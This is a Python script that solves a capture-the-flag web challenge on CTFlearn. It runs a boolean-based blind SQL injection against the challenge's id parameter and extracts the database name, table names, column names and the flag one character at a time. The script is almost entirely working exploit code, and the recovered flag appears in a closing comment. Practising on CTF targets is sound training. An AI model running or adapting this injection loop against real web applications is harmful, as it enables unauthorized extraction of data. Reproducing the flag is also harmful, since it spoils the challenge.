import requests
import string

message = range(97,123) + range(48,58) + range(32,48) + range(91,97) + range(123,128) + range(65,91)

url = "https://web.ctflearn.com/web8/?id=1"
not_found = "0 results"

"""
# Get databse length
print "Finding Database length"
for i in range(1,32) :
	param = " and (select length(database()))=%s" % (str(i))
	r = requests.get(url+param)
	if r.text.find(not_found) == -1 :
		database_length = i
		print "length of the database name is %s" % database_length
		break

# getting database name
print "\nFinding databse name"
database_name = ""
for i in range(1,database_length+1) :
	for j in range(32,128) :
		param = " and (select ascii(substring(database(),%s,1)))=%s" % (str(i), str(j))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			database_name += chr(j)
			print database_name + "*"*(database_length-len(database_name))
			break

# getting number of tables
print "\nGetting number of tables"
for i in range(1,32) :
	param = " and (select count(*) from information_schema.tables where table_schema=database())=%s" % (str(i))
	r = requests.get(url+param)
	if r.text.find(not_found) == -1 :
		no_of_tables = i
		print "number of tables %s" % no_of_tables
		break

# getting the length of the name of the tables
lengths_of_table = []
print "\n getting the length of the names of the table"
for i in range(no_of_tables) :
	for j in range(1,32) :
		param = " and (select length(table_name) from information_schema.tables where table_schema=database() limit %s,1)=%s" % (str(i), str(j))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			lengths_of_table.append(j)
			print "Length of table %s is %s" % (str(i+1), str(j))
			break
"""

# getting the name of the tables 1
"""print "\ngetting the name of table 1"
table1 = ""
for i in range(1,17) :
	for j in message :
		param = " and (select ascii(substring(table_name,%s,1)) from information_schema.tables where table_schema=database() limit 0,1)=%s" % (str(i), str(j))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			table1 += chr(j)
			print table1 + "*"*(16-len(table1))
			break"""
"""
# getting the name of the tables 2
print "\ngetting the name of table 2"
table2 = ""
for i in range(1,9) :
	for j in message :
		param = " and (select ascii(substring(table_name,%s,1)) from information_schema.tables where table_schema=database() limit 1,1)=%s" % (str(i), str(j))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			table2 += chr(j)
			print table2 + "*"*(8-len(table2))
			break
"""
# No of columns

"""print "\ngetting columns"
for i in range(1,10) :
	#param = " and (select count(*) from information_schema.columns where table_schema=database())=%s" % (str(i))
	param = " and (select count(column_name) from information_schema.columns where table_schema=database())=%s" % (str(i))
	r = requests.get(url+param)
	if r.text.find(not_found) == -1 :
		column1 = i
		print "number of columns %s" % column1
		break"""

# getting length and name of columns
"""for i in range(5) :
	for j in range(1,32) :
		param = " and (select length(column_name) from information_schema.columns where table_schema=database() limit %s,1)=%s" % (str(i), str(j))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			column_length = j
			print "Length of the name of column %s is %s" % (str(i), str(column_length))
			break
	column_name = ""
	for l in range(1, column_length+1) :
		for c in message :
			param = " and (select ascii(substring(column_name,%s,1)) from information_schema.columns where table_schema=database() limit %s,1)=%s" % (str(l), str(i), str(c))
			r = requests.get(url+param)
			if r.text.find(not_found) == -1 :
				column_name += chr(c)
				print column_name + "*"*(column_length-len(column_name))
				break"""

# column_name = f0und_m3
# table_name = w0w_y0u_f0und_m3

"""for i in range(1,10) :
	param = " and (select count(f0und_m3) from w0w_y0u_f0und_m3)=%s" % (str(i))
	r = requests.get(url+param)
	if r.text.find(not_found) == -1 :
		no_of_entry = 1
		print no_of_entry
		break

for i in range(1,32) :
	param = " and (select length(f0und_m3) from w0w_y0u_f0und_m3 limit 0,1)=%s" % (str(i))
	r = requests.get(url+param)
	if r.text.find(not_found) == -1 :
		flag_length = i
		print "Flag length %s" % flag_length
		break
"""
flag_length = 31
flag = ""
for i in range(1,flag_length+1) :
	for c in message :
		param = " and (select ascii(substring(f0und_m3,%s,1)) from w0w_y0u_f0und_m3)=%s" % (str(i), str(c))
		r = requests.get(url+param)
		if r.text.find(not_found) == -1 :
			flag += chr(c)
			print flag + "*"*(flag_length-len(flag))
			break

# flag = abctf{uni0n_1s_4_gr34t_c0mm4nd}